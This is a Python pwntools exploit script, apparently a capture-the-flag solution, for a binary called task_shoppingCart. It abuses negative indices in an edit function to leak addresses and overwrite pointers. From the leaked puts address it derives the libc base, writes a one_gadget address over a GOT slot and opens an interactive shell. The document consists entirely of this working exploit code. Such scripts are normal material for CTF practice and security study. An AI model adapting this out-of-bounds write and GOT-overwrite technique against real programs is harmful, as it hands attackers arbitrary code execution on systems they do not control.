from pwn import *
from LibcSearcher import LibcSearcher
from time import sleep 
# context.log_level="debug"

p = process("./task_shoppingCart")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def get_money(name):
	p.recvuntil("a rich man!\n")
	p.sendline("1")
	p.recvuntil("RMB or Dollar?\n")
	p.sendline(name)

def edit(idx , content = None ):
	p.recv()
	p.sendline("3")
	p.recvuntil("modify?\n")
	p.sendline(str(idx))
	sleep(0.1)
	p.recvuntil("modify ")
	data = p.recvuntil(" to?\n")[:-5]
	# print len(data)
	if content == None:
		return_data = u64(data[:6] + "\x00\x00")
		p.send(p64(return_data)[:7])
	else:
		if len(content) == 8:
			content = content[:7]
		p.send(content)
		return_data = data
	return return_data

def add(size , name):
	p.recvuntil("buy!\n")
	p.sendline("1")
	p.recvuntil("How long is your goods name?\n")
	p.sendline(str(size))
	p.recvuntil("What is your goods name?\n")
	p.send(name)

# fill money_list
for i in range(14):
	get_money("123")
# end shopping 1
p.recvuntil("man!\n")
p.sendline("3")
# get data_segment addr
data = edit(-47)
print hex(data)
# get got addr
puts_offset = 0x48
free_offset = 0x50
mong_list_offset = 0x38
puts_got = data - puts_offset
free_got = data - free_offset
money_list = data + mong_list_offset

edit(-18 , p64(money_list + 3*8))
edit(-17 , p64(puts_got))

puts_addr = edit(-38)
print "puts_got : " + hex(puts_got)
print "puts_addr : " + hex(puts_addr)
# libc = LibcSearcher("puts" , puts_addr)
# libc_base = puts_addr - libc.dump("puts")
# print "libc_base : " + hex(libc_base)
# system_addr = libc_base + libc.dump("system")
# str_bin_sh = libc_base + libc.dump("str_bin_sh")
libc_base = puts_addr - libc.symbols["puts"]
print "libc_base : " + hex(libc_base)
one_gadget = libc_base + 0x45216
edit(-38 , p64(one_gadget))
p.interactive()